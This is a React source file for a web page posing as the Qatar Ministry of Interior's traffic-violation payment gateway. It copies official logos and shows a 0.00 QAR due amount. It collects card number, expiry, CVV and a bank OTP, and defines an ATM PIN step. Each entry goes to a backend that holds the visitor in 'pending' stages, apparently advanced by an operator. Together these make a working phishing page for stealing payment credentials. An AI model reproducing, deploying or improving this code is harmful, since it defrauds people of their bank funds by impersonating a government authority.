import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  ShieldCheck,
  Lock,
  CreditCard,
  Loader2,
  CheckCircle2,
  AlertCircle,
  Menu,
  Wifi,
  Battery
} from "lucide-react";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang, isRTL } = useLanguage();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
      refetchInterval: 3000,
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] font-sans selection:bg-qatar-maroon/10" dir="rtl">
      {/* iOS-style Status Bar */}
      <div className="bg-[#008A95] px-6 py-2 flex justify-between items-center text-white text-xs font-bold sticky top-0 z-50">
        <div className="flex items-center gap-4">
          <Menu size={18} className="opacity-90" />
          <div className="flex items-center gap-1.5">
            <span>1:26</span>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <span className="font-black">4G</span>
          <Wifi size={14} />
          <Battery size={18} className="rotate-180" />
        </div>
      </div>

      {/* Official Header */}
      <div className="bg-white px-6 py-5 flex justify-between items-center border-b border-gray-100 shadow-sm sticky top-[36px] z-40">
        <div className="flex items-center">
           <img src="/qatar-payment-text.png" alt="Payment Gateway" className="h-10 md:h-12 object-contain" />
        </div>
        <div className="h-8 w-[1.5px] bg-gray-200 mx-4 rounded-full"></div>
        <div className="flex items-center">
           <img src="/qatar-moi-logo-new.png" alt="MOI Qatar" className="h-14 md:h-16 object-contain" />
        </div>
      </div>

      <main className="max-w-md mx-auto px-4 py-10">
        <div className="bg-white rounded-[2.5rem] shadow-2xl shadow-gray-200 border border-white overflow-hidden animate-in fade-in zoom-in-95 duration-500">
          <div className="bg-[#8A1538] p-10 text-white text-center relative overflow-hidden">
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 blur-2xl"></div>
            <div className="absolute bottom-0 left-0 w-24 h-24 bg-black/5 rounded-full -ml-12 -mb-12 blur-xl"></div>
            
            <h1 className="text-3xl font-black tracking-tight">{lang === "ar" ? "بوابة الدفع الإلكتروني" : "Electronic Payment Gateway"}</h1>
            <p className="text-sm font-bold opacity-70 mt-3 uppercase tracking-widest">{lang === "ar" ? "دفع المخالفات المرورية" : "Traffic Violations Payment"}</p>
          </div>

          <div className="p-10">
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-8">
                <div className="flex justify-between items-center pb-8 border-b border-gray-50">
                  <span className="text-gray-400 font-black text-sm uppercase tracking-tighter">{lang === "ar" ? "إجمالي المبلغ المستحق" : "Total Due Amount"}</span>
                  <div className="text-right">
                    <span className="text-4xl font-black text-[#8A1538]">0.00</span>
                    <span className="text-sm font-black text-[#8A1538] mr-1">QAR</span>
                  </div>
                </div>

                {error && (
                  <div className="p-4 bg-red-50 border border-red-100 rounded-2xl text-red-600 text-xs font-bold flex items-center gap-3 animate-in shake duration-500">
                    <AlertCircle size={18} />
                    {error}
                  </div>
                )}

                <div className="space-y-6">
                  <div className="space-y-2">
                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-[0.2em] pr-1">{lang === "ar" ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                    <input
                      type="text"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value)}
                      className="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:ring-4 focus:ring-[#8A1538]/5 transition-all font-black text-gray-800 placeholder:text-gray-300"
                      placeholder="NAME AS PRINTED ON CARD"
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-[0.2em] pr-1">{lang === "ar" ? "رقم البطاقة البنكية" : "Card Number"}</label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        maxLength={16}
                        className="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:ring-4 focus:ring-[#8A1538]/5 transition-all pl-14 font-black text-gray-800 tracking-[0.2em] placeholder:text-gray-300"
                        placeholder="0000 0000 0000 0000"
                        required
                      />
                      <CreditCard className="absolute left-5 top-5 text-gray-300" size={24} />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <label className="block text-[10px] font-black text-gray-400 uppercase tracking-[0.2em] pr-1">{lang === "ar" ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input
                        type="text"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        placeholder="MM/YY"
                        className="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:ring-4 focus:ring-[#8A1538]/5 transition-all text-center font-black text-gray-800 placeholder:text-gray-300"
                        required
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="block text-[10px] font-black text-gray-400 uppercase tracking-[0.2em] pr-1">{lang === "ar" ? "الرمز السري" : "CVV"}</label>
                      <input
                        type="password"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value)}
                        maxLength={4}
                        placeholder="•••"
                        className="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:ring-4 focus:ring-[#8A1538]/5 transition-all text-center font-black text-gray-800 placeholder:text-gray-300"
                        required
                      />
                    </div>
                  </div>
                </div>

                <div className="bg-blue-50/50 p-5 rounded-2xl flex gap-4 items-start border border-blue-100/50">
                  <ShieldCheck className="text-blue-600 flex-shrink-0 mt-0.5" size={22} />
                  <p className="text-[11px] text-blue-900 leading-relaxed font-bold opacity-80">
                    {lang === "ar" 
                      ? "نظام الدفع لدينا مؤمن بالكامل. يتم تشفير بياناتك الحساسة ومعالجتها عبر بوابات دفع عالمية معتمدة."
                      : "Our payment system is fully secured. Your sensitive data is encrypted and processed via certified global gateways."}
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={submitCardMutation.isPending}
                  className="w-full py-6 bg-[#8A1538] text-white rounded-[1.5rem] font-black text-xl hover:bg-[#6D112C] active:scale-[0.98] transition-all flex justify-center items-center gap-3 shadow-2xl shadow-[#8A1538]/20"
                >
                  {submitCardMutation.isPending ? (
                    <Loader2 className="animate-spin" />
                  ) : (
                    <>
                      <Lock size={22} />
                      {lang === "ar" ? "إتمام الدفع الآمن" : "Secure Payment"}
                    </>
                  )}
                </button>
              </form>
            )}

            {/* Stages Section (OTP, Pending, Success) with consistent styling */}
            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-24 text-center space-y-10">
                <div className="relative w-28 h-28 mx-auto">
                   <div className="absolute inset-0 border-8 border-gray-50 rounded-full"></div>
                   <div className="absolute inset-0 border-8 border-[#8A1538] rounded-full border-t-transparent animate-spin"></div>
                   <ShieldCheck className="absolute inset-0 m-auto text-[#8A1538] animate-pulse" size={48} />
                </div>
                <div className="space-y-3">
                  <h3 className="text-3xl font-black text-gray-900">{lang === 'ar' ? 'جاري المعالجة' : 'Processing'}</h3>
                  <p className="text-gray-400 font-bold text-sm max-w-[240px] mx-auto leading-relaxed">{lang === 'ar' ? 'يرجى الانتظار، نقوم بتأمين اتصالك مع البنك الخاص بك' : 'Please wait while we secure your connection with your bank'}</p>
                </div>
              </div>
            )}

            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-10 py-6">
                <div className="w-24 h-24 bg-blue-50 text-blue-600 rounded-3xl flex items-center justify-center mx-auto shadow-xl shadow-blue-100/50 rotate-3">
                  <Lock size={48} />
                </div>
                <div className="space-y-3">
                  <h3 className="text-3xl font-black text-gray-900">رمز التحقق</h3>
                  <p className="text-gray-400 font-bold text-sm">أدخل الرمز المكون من 6 أرقام المرسل لهاتفك</p>
                </div>
                <input
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  className="w-full text-center text-5xl font-black tracking-[1rem] p-8 bg-gray-50 border-2 border-gray-100 rounded-3xl outline-none focus:border-[#8A1538] focus:bg-white transition-all shadow-inner"
                  placeholder="••••••"
                  maxLength={6}
                  required
                />
                <button
                  type="submit"
                  disabled={submitOtpMutation.isPending}
                  className="w-full bg-[#8A1538] text-white font-black py-6 rounded-[1.5rem] shadow-2xl shadow-[#8A1538]/20 flex items-center justify-center text-xl active:scale-[0.98] transition-all"
                >
                  {submitOtpMutation.isPending ? <Loader2 className="animate-spin" /> : "تأكيد العملية"}
                </button>
              </form>
            )}

            {stage === "success" && (
              <div className="py-20 text-center space-y-10">
                <div className="w-28 h-28 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto shadow-xl shadow-green-100 animate-bounce">
                  <CheckCircle2 size={64} />
                </div>
                <div className="space-y-3">
                  <h3 className="text-4xl font-black text-gray-900 tracking-tighter">تم بنجاح</h3>
                  <p className="text-gray-400 font-bold">تمت معالجة دفعتك وإصدار الإيصال بنجاح.</p>
                </div>
                <button
                  onClick={() => navigate(isRTL ? "/ar" : "/")}
                  className="bg-gray-900 text-white font-black py-6 px-16 rounded-[1.5rem] hover:bg-black transition-all shadow-2xl active:scale-[0.98]"
                >
                  العودة للرئيسية
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="mt-16 flex justify-center gap-10 opacity-20 grayscale hover:grayscale-0 transition-all duration-500">
          <img src="/card-brands.png" alt="Payment Methods" className="h-12 object-contain" />
        </div>
      </main>
    </div>
  );
}
